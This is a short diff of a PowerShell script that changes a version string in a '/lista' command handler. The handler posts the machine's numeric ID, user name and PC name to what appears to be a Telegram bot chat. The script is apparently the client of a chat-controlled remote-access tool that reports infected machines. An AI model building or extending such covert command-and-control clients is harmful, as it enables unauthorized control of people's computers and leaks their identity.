@@ -77,7 +77,7 @@ while ($true) {
 
                 # --- COMANDO GLOBAL: /lista ---
                 if ($Comando -eq "/lista") {
-                    $RespuestaLista = "ver 4🖥️ EQUIPO EN LINEA:`nID Numerico: [" + $MiIDNum + "] -> " + $User + "@" + $MiPC
+                    $RespuestaLista = "ver 5 EQUIPO EN LINEA:`nID Numerico: [" + $MiIDNum + "] -> " + $User + "@" + $MiPC
                     [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $RespuestaLista })
                     continue
                 }
